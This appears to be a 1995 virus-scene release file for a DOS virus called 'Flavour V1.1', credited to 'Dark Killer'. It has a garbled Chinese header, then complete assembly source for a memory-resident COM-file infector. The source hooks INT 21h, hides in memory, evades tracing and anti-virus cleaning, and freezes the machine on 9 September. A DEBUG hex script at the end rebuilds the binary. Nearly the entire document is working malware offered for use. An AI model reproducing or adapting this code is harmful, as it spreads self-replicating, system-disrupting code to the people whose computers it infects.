
                                                                     P.008

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘B ´Á      TP
         oV                                                        PV
         TO                 Ææ  Flavour virus  Ææ                  Vo
         pT                                                        OT
         VP                    by  Dark Killer                     VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


       ¯f¬r¯S¼x¡R

            Æ« ªø«× 848 Bytes¡A¶È·P¬V¶W¹L 6144 Bytes ªº COM ÀÉ¡C
            Æ¬ §â DOS ³Ì«á¤@­Ó MCB ÁY¤p«á¦AÂÃ¶i¥h¡C
            Æ­ ©ó¨C¦~¤§¤E¤ë¤E¤éµo§@¡A°T®§¦p¤U¡R

               "Hello !!
                  I am [Flavour V1.1] By Dark Killer ...
                    At Taiwan Power Virus Organization !

                                      1995/07/01/Saturday"

;=============================================================================
; This is source code of [Flavour V1.1] , written by Dark Killer .
;                                                         1995/07/01/Saturday
;=============================================================================
                .286c
flavour11       segment
                assume  cs:flavour11
                org     0000h
vir_start:
                mov     bp,sp                           ; Anti-Trace and
                cli                                     ; Anti-TBClean.
                mov     sp,0000h
                mov     sp,bp
                sti
ok:
                call    next                            ; Get Address.
next:
                pop     si
                sub     si,offset next

                mov     ah,2ah                          ; 9/9 -> Peter Ferng's
                int     21h                             ; Birthday
                cmp     dx,0909h
                jne     con5

                mov     ah,09h
                lea     dx,[si+offset msg_e]
                int     21h
down_pc:                                                ; Down
                cli
                jmp     short down_pc
con5:
                mov     ax,8f00h                        ; Does memory have
                int     21h                             ; me ?
                cmp     ax,008fh
                jne     install
run_com:
                add     si,offset head_read             ; Return
                mov     di,0100h
                push    ss
                push    di
                cld
                movsw
                movsw
                push    ss
                pop     ds
                retf
install:
                xor     di,di
                mov     ah,52h
                int     21h
                mov     bx,es:[bx-02h]                  ; Get the First MCB
loop1:
                mov     es,bx
                add     bx,es:[di+03h]
                inc     bx
                cmp     byte ptr es:[di],"Z"
                jne     loop1
                mov     ax,es
                mov     es,bx
                cmp     byte ptr es:[di],"M"
                je      loop2
                mov     es,ax
                jmp     short last_mcb
loop2:
                mov     es,bx
                add     bx,word ptr es:[di+03h]
                inc     bx
                cmp     byte ptr es:[di],"M"
                je      loop2
last_mcb:
                sub     word ptr es:[di+03h],vir_para

                mov     ax,es:[di+03h]
                mov     cx,es
                add     ax,cx
                inc     ax
                mov     es,ax
                push    ax
                push    offset con1

                cld
                mov     cx,vir_size
                rep     movsb

                retf
con1:
                cli
                mov     ds,cx
                mov     ax,offset newint21h
                xchg    word ptr ds:[0084h],ax
                mov     word ptr cs:oldint21h,ax        ; Save Int 21h
                mov     word ptr cs:outint21h,ax
                mov     word ptr cs:entint21h,ax
                mov     ax,cs
                xchg    word ptr ds:[0086h],ax
                mov     word ptr cs:oldint21h+0002h,ax
                mov     word ptr cs:outint21h+0002h,ax
                mov     word ptr cs:entint21h+0002h,ax

                call    trace_int21h                    ; Trace Int 21h

                push    ss
                pop     es
                push    cs
                pop     ds
                xor     si,si
                jmp     run_com

trace_int21h    proc    near
                mov     ah,52h                          ; ES = DOS Data Segment
                int     21h
                mov     al,90h
                mov     cx,0fffeh
                xor     di,di
                cld
loop4:
                repne   scasb
                jcxz    trace_int21h_con1
                cmp     es:[di],al
                jne     loop4
                cmp     word ptr es:[di+01h],0cce8h
                jne     loop4
                mov     di,word ptr es:[di+07h]
                les     di,dword ptr es:[di]
                mov     word ptr cs:outint21h,di
                mov     word ptr cs:entint21h,di
                mov     word ptr cs:outint21h+0002h,es
                mov     word ptr cs:entint21h+0002h,es
trace_int21h_con1:
                mov     al,06h
                mov     cx,0100h
loop5:
                repne   scasb
                jcxz    trace_int21h_cant
                cmp     word ptr es:[di],551eh
                jne     trace_int21h_cant
                cmp     word ptr es:[di+02h],5657h
                jne     trace_int21h_cant
                dec     di
                mov     word ptr cs:entint21h,di
                mov     word ptr cs:entint21h+0002h,es
trace_int21h_cant:
                ret
trace_int21h    endp

head_read       db      0cdh,20h,00h,00h
head_write      db      0f0h,0e9h,00h,00h
oldint21h       dd      00000000h
outint21h       dd      00000000h
entint21h       dd      00000000h                       ; Int 21h Entry-Point
byte_table      db      90h
                db      0cch
                db      0f5h
                db      0f8h
                db      0f9h
                db      0fah
                db      0fbh
                db      0fch
word_table      db      0cdh,12h
                db      0e2h,0feh
                db      0ebh,00h
                db      0b1h,0ffh
msg_e           db      "Hello !!",0dh,0ah
                db      "  I am [Flavour V1.1] By Dark Killer ...",0dh,0ah
                db      "    At Taiwan Power Virus Organization !",0dh,0ah
                db      0dh,0ah
                db      "                     1995/07/01/Saturday",0dh,0ah
                db      "$"

newint21h       proc    far
                call    trace_off
                pushf
                cmp     ax,8f00h                        ; Check me...
                je      @8f00
                cmp     ah,3dh                          ; If open file
                je      infect_3d4356                   ;
                cmp     ah,43h                          ; If load/set file
                je      infect_3d4356                   ; attrib
                cmp     ah,4bh                          ; If run file
                je      infect                          ;
                cmp     ah,56h
                je      infect_3d4356
                popf
                jmp     dword ptr cs:oldint21h
@8f00:
                xchg    ah,al
                popf
                iret
infect_3d4356:
                pusha

                mov     si,dx
                cld
loop3:
                lodsb
                or      al,al
                je      infect_3d4356_cannot
                cmp     al,"."
                jne     loop3
                lodsb
                cmp     al,"C"
                je      con2
                cmp     al,"c"
                jne     infect_3d4356_cannot
con2:
                lodsb
                cmp     al,"O"
                je      con3
                cmp     al,"o"
                jne     infect_3d4356_cannot
con3:
                lodsb
                cmp     al,"M"
                je      con4
                cmp     al,"m"
                jne     infect_3d4356_cannot
con4:
                popa
                jmp     short infect
infect_3d4356_cannot:
                popa
                popf
                jmp     dword ptr cs:oldint21h
infect:
                pusha
                push    ds
                push    es

                cli                                     ; I will over Int 2ah
                push    00h                             ; & Int 24h & Int 94h
                pop     es

                push    word ptr es:[0250h]
                push    word ptr es:[0252h]
                mov     word ptr es:[0250h],offset newint94h
                mov     word ptr es:[0252h],cs

                push    word ptr es:[00a8h]
                push    word ptr es:[00aah]
                mov     word ptr es:[00a8h],offset newint2ah
                mov     word ptr es:[00aah],cs

                push    word ptr es:[0090h]
                push    word ptr es:[0092h]
                mov     word ptr es:[0090h],offset newint24h
                mov     word ptr es:[0092h],cs

                mov     ax,3d00h
                call    callout21h
                jc      newint21h_exit0
                xchg    bx,ax

                push    bx                              ; Get JFT...
                mov     ax,1220h
                int     2fh
                mov     ax,1216h                        ; Get SFT...
                xor     bh,bh
                mov     bl,es:[di]
                int     2fh
                pop     bx

                mov     byte ptr es:[di+02h],02h        ; Change file mode
                mov     al,byte ptr es:[di+04h]
                mov     byte ptr es:[di+04h],00h        ; Save file attrib
                push    ax
                or      byte ptr es:[di+06h],40h        ; Don't change date and
                                                        ; time of file
                push    cs
                pop     ds
                mov     ah,3fh                          ; Load File Head...
                mov     cx,0004h
                mov     dx,offset head_read
                call    callout21h

                cmp     word ptr head_read,0e9f0h       ; Infected...
                je      newint21h_exit1
                cmp     word ptr head_read,"ZM"         ; .EXE
                je      newint21h_exit1

                mov     al,02h
                call    seek

                or      dx,dx
                jne     newint21h_exit1
                cmp     ax,1800h
                jbe     newint21h_exit1

                sub     ax,0004h
                mov     word ptr head_write+0002h,ax

                mov     ah,40h
                mov     cx,vir_size
                cwd
                call    callint21h

                xor     al,al
                call    seek

                mov     ah,40h
                mov     cl,04h
                mov     dx,offset head_write
                call    callint21h
newint21h_exit1:
                pop     ax
                mov     es:[di+04h],al

                mov     ah,3eh                          ; Close File
                call    callout21h
newint21h_exit0:
                push    00h
                pop     es
                cli

                pop     word ptr es:[0092h]             ; Change Int 24h
                pop     word ptr es:[0090h]

                pop     word ptr es:[00aah]             ; Change Int 2ah
                pop     word ptr es:[00a8h]

                pop     word ptr es:[0252h]             ; Change Int 94h
                pop     word ptr es:[0250h]

                pop     es
                pop     ds
                popa

                popf
                jmp     dword ptr cs:oldint21h
newint21h       endp

newint2ah       proc    far
                iret
newint2ah       endp

newint24h       proc    far
                xor     al,al
                iret
newint24h       endp

newint94h       proc    near
                iret
newint94h       endp

callint21h      proc    near
                call    trace_off
                pushf
                cli
                call    dword ptr cs:entint21h
                ret
callint21h      endp

callout21h      proc    near
                call    trace_off
                pushf
                cli
                call    dword ptr cs:outint21h
                ret
callout21h      endp

seek            proc    near
                mov     ah,42h
                xor     cx,cx
                cwd
                call    callout21h
                ret
seek            endp

trace_off       proc    near
                push    ax
                pushf
                pop     ax
                and     ah,0feh
                push    ax
                mov     ax,ss
                mov     ss,ax
                db      0f0h                            ; lock = 0f0h
                popf
                pop     ax
                ret
trace_off       endp

vir_end:

vir_size        equ     offset vir_end-offset vir_start
vir_para        equ     (vir_size+000fh)/10h

flavour11       ends
                end     vir_start
;=============================================================================

======================================================
N FLAVOUR4.COM
E 0100 E8 00 00 5E 81 EE 03 00 B4 2A CD 21 81 FA 09 09
E 0110 75 0B B4 09 8D 94 3B 01 CD 21 FA EB FD B8 00 8F
E 0120 CD 21 3D 8F 00 75 0F 81 C6 26 01 BF 00 01 16 57
E 0130 FC A5 A5 16 1F CB 33 FF B4 52 CD 21 26 8B 5F FE
E 0140 8E C3 26 03 5D 03 43 26 80 3D 5A 75 F3 8C C0 8E
E 0150 C3 26 80 3D 4D 74 04 8E C0 EB 0D 8E C3 26 03 5D
E 0160 03 43 26 80 3D 4D 74 F3 26 81 6D 03 39 00 26 8B
E 0170 45 03 8C C1 03 C1 40 8E C0 50 68 84 00 FC B9 8F
E 0180 03 F3 A4 CB FA 8E D9 B8 C9 01 87 06 84 00 2E A3
E 0190 2E 01 2E A3 36 01 8C C8 87 06 86 00 2E A3 30 01
E 01A0 2E A3 38 01 E8 09 00 16 07 0E 1F 33 F6 E9 77 FF
E 01B0 9C 60 06 2E C6 06 3A 01 00 B4 52 CD 21 FC B0 90
E 01C0 B9 80 FF 33 FF F2 AE E3 59 AE 75 F9 26 81 3D E8
E 01D0 CC 75 F2 26 81 7D 02 00 2E 75 EA 26 81 7D 04 FF
E 01E0 2E 75 E2 26 8B 7D 06 26 C4 3D 2E 89 3E 36 01 2E
E 01F0 8C 06 38 01 B0 8C B9 80 FF 2B CF F2 AE E3 23 26
E 0200 81 3D D8 2E 75 F5 26 81 7D 02 8E 1E 75 ED 26 81
E 0210 7D 04 E7 3D 75 E5 47 2E 89 3E 36 01 2E C6 06 3A
E 0220 01 01 07 61 9D C3 CD 20 00 00 F0 E9 00 00 00 00
E 0230 00 00 00 00 00 00 00 00 00 00 00 48 65 6C 6C 6F
E 0240 20 21 21 0D 0A 20 20 49 20 61 6D 20 5B 46 6C 61
E 0250 76 6F 75 72 20 56 31 2E 33 E1 5D 20 42 79 20 44
E 0260 61 72 6B 20 4B 69 6C 6C 65 72 20 2E 2E 2E 0D 0A
E 0270 20 20 20 20 61 74 20 54 61 69 77 61 6E 20 50 6F
E 0280 77 65 72 20 56 69 72 75 73 20 4F 72 67 61 6E 69
E 0290 7A 61 74 69 6F 6E 20 21 21 0D 0A 0D 0A 20 20 20
E 02A0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20
E 02B0 20 20 20 20 20 20 20 20 20 20 20 20 31 39 39 35
E 02C0 2F 30 37 2F 30 36 0D 0A 24 E8 B4 01 9C 3D 00 8F
E 02D0 74 1A 80 FC 3D 74 19 80 FC 43 74 14 80 FC 4B 74
E 02E0 41 80 FC 56 74 0A 9D 2E FF 2E 2E 01 86 E0 9D CF
E 02F0 60 8B F2 FC AC 0A C0 74 22 3C 2E 75 F7 AC 3C 43
E 0300 74 04 3C 63 75 15 AC 3C 4F 74 04 3C 6F 75 0C AC
E 0310 3C 4D 74 04 3C 6D 75 03 61 EB 07 61 9D 2E FF 2E
E 0320 2E 01 60 1E 06 FA 6A 00 07 26 FF 36 50 02 26 FF
E 0330 36 52 02 26 C7 06 50 02 4E 03 26 8C 0E 52 02 26
E 0340 FF 36 A8 00 2E 8F 06 32 01 26 FF 36 AA 00 2E 8F
E 0350 06 34 01 26 C7 06 A8 00 2F 03 26 8C 0E AA 00 26
E 0360 FF 36 90 00 26 FF 36 92 00 26 C7 06 90 00 4B 03
E 0370 26 8C 0E 92 00 B8 00 3D E8 D4 00 72 7D 93 53 B8
E 0380 20 12 CD 2F B8 16 12 32 FF 26 8A 1D CD 2F 5B 26
E 0390 C6 45 02 02 26 8A 45 04 26 C6 45 04 00 50 26 80
E 03A0 4D 06 40 0E 1F B4 3F B9 04 00 BA 26 01 E8 9F 00
E 03B0 2E 81 3E 26 01 F0 E9 74 37 2E 81 3E 26 01 4D 5A
E 03C0 74 2E B0 02 E8 B0 00 0B D2 75 25 0A C0 74 21 83
E 03D0 E8 04 2E A3 2C 01 B4 40 B9 8F 03 BA 00 00 E8 6E
E 03E0 00 32 C0 E8 91 00 B4 40 B1 04 BA 2A 01 E8 5F 00
E 03F0 58 26 88 45 04 B4 3E E8 55 00 6A 00 07 FA 26 8F
E 0400 06 92 00 26 8F 06 90 00 2E FF 36 34 01 26 8F 06
E 0410 AA 00 2E FF 36 32 01 26 8F 06 A8 00 26 8F 06 52
E 0420 02 26 8F 06 50 02 07 1F 61 9D 2E FF 2E 2E 01 9C
E 0430 80 FC 82 74 06 9D 2E FF 2E 2E 01 53 B3 60 E8 3F
E 0440 00 9C FA 2E FF 1E 32 01 5B 9D CF 32 C0 CF CF E8
E 0450 2E 00 9C FA 0E 68 76 03 2E 80 3E 3A 01 00 74 0B
E 0460 06 1E 55 57 56 52 51 53 50 8C D8 2E FF 36 38 01
E 0470 2E FF 36 36 01 CB C3 B4 42 33 C9 99 E8 D0 FF C3
E 0480 50 9C 58 80 E4 FE 50 8C D0 8E D0 F0 9D 58 C3
RCX
38F
W
Q
======================================================

